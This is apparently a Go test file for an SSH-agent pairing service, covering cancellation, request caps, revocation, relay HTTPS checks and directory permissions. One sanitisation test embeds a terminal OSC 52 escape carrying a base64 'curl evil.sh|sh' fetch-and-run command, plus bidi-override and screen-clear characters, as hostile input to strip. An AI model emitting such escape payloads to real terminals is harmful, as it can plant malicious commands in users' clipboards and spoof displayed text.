package agent_test

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/CryptexIndustries/vault-web/services/internal/agent"
	"github.com/CryptexIndustries/vault-web/services/internal/agent/approvertest"
	"github.com/CryptexIndustries/vault-web/services/internal/agent/termsafe"
)

// Without Enter (EOF, Ctrl-C) nothing is saved and the registration the
// approver made goes away again.
func TestPairCancelled(t *testing.T) {
	for _, how := range []string{"eof", "ctrl-c"} {
		t.Run(how, func(t *testing.T) {
			e := newEnv(t)
			codes, confirms := make(chan string, 1), make(chan string, 1)
			in, enter := io.Pipe()
			defer enter.Close()
			ctx, cancel := context.WithCancel(e.ctx)
			defer cancel()
			var out syncBuffer
			done := make(chan error, 1)
			go func() {
				_, err := agent.Pair(ctx, agent.PairOptions{
					Paths: e.paths, RelayURL: e.relay.URL, Out: &out, In: in,
					OnCode:    func(c string) { codes <- c },
					OnConfirm: func(c string) { confirms <- c },
				})
				done <- err
			}()
			paired, err := e.approver.Pair(e.ctx, <-codes, signers(t)[:1], "workstation")
			if err != nil {
				t.Fatal(err)
			}
			if code := <-confirms; code != paired.ConfirmationCode {
				t.Fatalf("agent shows %s, approver %s", code, paired.ConfirmationCode)
			}
			if !e.relay.IsAgent(paired.Key) {
				t.Fatal("approver didn't register the agent")
			}
			if how == "eof" {
				enter.Close()
			} else {
				cancel()
			}
			if err := <-done; !errors.Is(err, agent.ErrPairingCancelled) {
				t.Fatalf("Pair = %v", err)
			}
			if !strings.HasSuffix(out.String(), "Press Enter if it matches, or Ctrl-C to cancel.\nPairing cancelled.\n") {
				t.Errorf("output:\n%s", out.String())
			}
			if st, err := (agent.Store{Dir: e.paths.DataDir}).LoadState(); st != nil || err != nil {
				t.Fatalf("state saved: %+v %v", st, err)
			}
			if e.relay.IsAgent(paired.Key) {
				t.Fatal("agent still registered on the relay")
			}
			if err := e.approver.WaitFor(e.ctx, func() bool { return e.approver.Revoked(paired.Key) }); err != nil {
				t.Fatal("approver not told the agent went away")
			}
			if e.approver.Confirmed(paired.Key) {
				t.Fatal("a cancelled pairing sent PairingConfirm")
			}
		})
	}
}

func TestWaitingRequestsAreCapped(t *testing.T) {
	e := newEnv(t)
	keys := signers(t)[:1]
	e.pair(keys)
	var log syncBuffer
	e.start(agent.Options{Logger: slog.New(slog.NewTextHandler(&log, nil))})
	key := keys[0].PublicKey()

	release := make(chan struct{})
	e.approver.SetPolicy(func(ctx context.Context, _ *approvertest.Request) approvertest.Decision {
		select {
		case <-release:
		case <-ctx.Done():
		}
		return approvertest.Approve
	})
	// ssh-agent connections answer one request at a time, so each waiting
	// request has its own.
	results := make(chan error, 4)
	for i := range 4 {
		ag, closeClient := e.client()
		defer closeClient()
		go func() {
			_, err := ag.Sign(key, fmt.Appendf(nil, "request %d", i))
			results <- err
		}()
	}
	if err := e.approver.WaitFor(e.ctx, func() bool { return len(e.approver.Requests()) == 4 }); err != nil {
		t.Fatal(err)
	}

	ag, closeClient := e.client()
	defer closeClient()
	start := time.Now()
	if _, err := ag.Sign(key, []byte("fifth")); err == nil {
		t.Fatal("a fifth waiting request was sent")
	}
	if took := time.Since(start); took > 2*time.Second {
		t.Errorf("the fifth request failed after %v", took)
	}
	if !strings.Contains(log.String(), "too many are waiting for the approver") {
		t.Errorf("no log line for the refused request:\n%s", log.String())
	}
	if n := len(e.approver.Requests()); n != 4 {
		t.Errorf("approver saw %d requests", n)
	}

	close(release)
	for range 4 {
		if err := <-results; err != nil {
			t.Fatal(err)
		}
	}
	if _, err := ag.Sign(key, []byte("after")); err != nil {
		t.Fatalf("sign once the others were answered: %v", err)
	}
}

func TestApproverStringsAreSanitized(t *testing.T) {
	e := newEnv(t)
	// OSC 52 would set the terminal's clipboard; U+202E reverses the text
	// after it.
	evil := "Pixel\x1b]52;c;Y3VybCBldmlsLnNofHNo\x07 ‮gnp.exe\n" + strings.Repeat("x", 80)
	approver, err := approvertest.Connect(e.ctx, approvertest.Options{RelayURL: e.relay.URL, Name: evil, AllowOther: true})
	if err != nil {
		t.Fatal(err)
	}
	defer approver.Close()
	e.approver = approver
	st, out := e.pair(signers(t)[:1])
	clean := termsafe.Name(evil)
	if !strings.Contains(out, clean+" wants to pair.") || !strings.Contains(out, "Paired with "+clean+" as") {
		t.Errorf("pair output:\n%q", out)
	}
	if st.ApproverName != clean {
		t.Errorf("saved approver name %q", st.ApproverName)
	}

	e.start(agent.Options{})
	if err := approver.SendKeys(e.ctx, e.paired.Key, signers(t)[:1], "lap\x1b[2Jtop⁦"); err != nil {
		t.Fatal(err)
	}
	e.waitFor("keys update", func() bool {
		st, _ := agent.Store{Dir: e.paths.DataDir}.LoadState()
		return st != nil && st.KeysRevision == 2
	})
	var status strings.Builder
	if err := agent.PrintStatus(e.paths, &status); err != nil {
		t.Fatal(err)
	}
	for name, text := range map[string]string{"pair": out, "status": status.String()} {
		if strings.ContainsAny(text, "\x1b\x07‮⁦") {
			t.Errorf("%s output has control characters:\n%q", name, text)
		}
	}
	if !strings.Contains(status.String(), `as "lap`+"�"+`[2Jtop`+"�"+`"`) {
		t.Errorf("status:\n%s", status.String())
	}
}

// A Revoked frame or STATUS_REVOKED isn't signed by the approver: the agent
// stops serving its keys but keeps them, and takes up again if the relay
// does.
func TestRelayClaimsRevoked(t *testing.T) {
	e := newEnv(t)
	keys := signers(t)[:2]
	e.pair(keys)
	e.start(agent.Options{RevokedRetry: 100 * time.Millisecond})
	ag, closeClient := e.client()
	defer closeClient()

	e.relay.ClaimRevoked(e.paired.Key, true)
	e.waitFor("revocation", func() bool { return e.svc.Status().Revoked })
	if l, _ := ag.List(); len(l) != 0 {
		t.Errorf("lists %d keys while revoked", len(l))
	}
	if _, err := ag.Sign(keys[0].PublicKey(), []byte("x")); err == nil {
		t.Error("signed while revoked")
	}
	st, _ := agent.Store{Dir: e.paths.DataDir}.LoadState()
	if !st.Revoked || len(st.Keys) != 2 {
		t.Fatalf("state: %+v", st)
	}
	var status strings.Builder
	agent.PrintStatus(e.paths, &status)
	if want := `This agent ("workstation") was revoked on Pixel 8, or the relay says so. Run cryptex-agent pair to connect again.`; !strings.Contains(status.String(), want) {
		t.Errorf("status:\n%s", status.String())
	}

	// Several retries, each answered REVOKED.
	time.Sleep(700 * time.Millisecond)
	if s := e.svc.Status(); !s.Revoked || s.Connected || s.Keys != 0 {
		t.Fatalf("status while the relay still says revoked: %+v", s)
	}

	e.relay.ClaimRevoked(e.paired.Key, false)
	e.waitFor("recovery", func() bool { s := e.svc.Status(); return s.Connected && !s.Revoked })
	if l, _ := ag.List(); len(l) != 2 {
		t.Errorf("lists %d keys after recovering", len(l))
	}
	if _, err := ag.Sign(keys[0].PublicKey(), []byte("x")); err != nil {
		t.Fatalf("sign after recovering: %v", err)
	}
	if st, _ := (agent.Store{Dir: e.paths.DataDir}).LoadState(); st.Revoked || len(st.Keys) != 2 {
		t.Fatalf("state after recovering: %+v", st)
	}
}

// An agent the relay keeps calling gone, revoked or unknown, asks less and
// less often and stops once the deadline passes, so a forgotten machine
// doesn't ask forever.
func TestAgentStopsAskingAboutAGoneAgent(t *testing.T) {
	for _, c := range []struct {
		name  string
		claim func(e *env)
	}{
		{"revoked", func(e *env) { e.relay.ClaimRevoked(e.paired.Key, true) }},
		{"unknown", func(e *env) { e.relay.Forget(e.paired.Key) }},
	} {
		t.Run(c.name, func(t *testing.T) {
			e := newEnv(t)
			e.pair(signers(t)[:1])
			var log syncBuffer
			e.start(agent.Options{
				Logger:       slog.New(slog.NewTextHandler(&log, nil)),
				RevokedRetry: 20 * time.Millisecond,
				GiveUpAfter:  300 * time.Millisecond,
			})
			e.waitFor("connection", func() bool { return e.svc.Status().Connected })
			c.claim(e)
			e.waitFor("the deadline", func() bool { return strings.Contains(log.String(), "no longer asking") })
			st, _ := agent.Store{Dir: e.paths.DataDir}.LoadState()
			if st.GoneSince.IsZero() {
				t.Fatalf("state: %+v", st)
			}
			asked := e.relay.Auths(e.paired.Key)
			time.Sleep(time.Second)
			if n := e.relay.Auths(e.paired.Key); n != asked {
				t.Errorf("asked the relay %d more times after giving up", n-asked)
			}
		})
	}
}

func TestClockOffsetWarning(t *testing.T) {
	e := newEnv(t)
	e.pair(signers(t)[:1])
	var log syncBuffer
	e.start(agent.Options{
		Logger: slog.New(slog.NewTextHandler(&log, nil)),
		Now:    func() time.Time { return time.Now().Add(-2 * time.Minute) },
	})
	// Reconnecting doesn't repeat it.
	e.relay.DropConnections()
	e.waitFor("disconnect", func() bool { return !e.svc.Status().Connected })
	e.waitFor("reconnect", func() bool { return e.svc.Status().Connected })
	if n := strings.Count(log.String(), "Your clock is off by about 120 s; requests may be refused"); n != 1 {
		t.Fatalf("warned %d times:\n%s", n, log.String())
	}
}

type failingTransport struct{}

func (failingTransport) RoundTrip(*http.Request) (*http.Response, error) {
	return nil, errors.New("no network in this test")
}

// Plain http is refused before any network use, except on this machine,
// like the approvers do.
func TestPlainHTTPRelayRefused(t *testing.T) {
	for url, refused := range map[string]bool{
		"http://relay.example.com":   true,
		"http://10.0.0.5:8080/relay": true,
		"http://127.0.0.2:8080":      true,
		"https://relay.example.com":  false,
		"http://localhost:8080":      false,
		"http://127.0.0.1:8080":      false,
		"http://[::1]:8080":          false,
	} {
		_, err := agent.Pair(context.Background(), agent.PairOptions{
			Paths: agent.Paths{DataDir: t.TempDir()}, RelayURL: url, Out: io.Discard,
			HTTPClient: &http.Client{Transport: failingTransport{}},
		})
		if err == nil {
			t.Fatalf("%s: paired without a network", url)
		}
		if got := strings.Contains(err.Error(), "must use https://"); got != refused {
			t.Errorf("%s: %v", url, err)
		}
		if got := strings.Contains(err.Error(), "no network in this test"); got == refused {
			t.Errorf("%s: %v", url, err)
		}
	}
}

func TestRuntimeDirMustBePrivate(t *testing.T) {
	e := newEnv(t)
	dir := filepath.Dir(e.paths.Socket)
	for _, mode := range []os.FileMode{0o777, 0o770, 0o722, 0o1777} {
		if err := os.Chmod(dir, mode); err != nil {
			t.Fatal(err)
		}
		_, err := agent.Listen(agent.Options{Paths: e.paths})
		if err == nil || !strings.Contains(err.Error(), "writable by other users") {
			t.Errorf("mode %04o: %v", mode, err)
		}
		if _, err := os.Lstat(e.paths.Socket); err == nil {
			t.Errorf("mode %04o: socket created", mode)
		}
	}
	os.Chmod(dir, 0o750)
	e.start(agent.Options{})
}
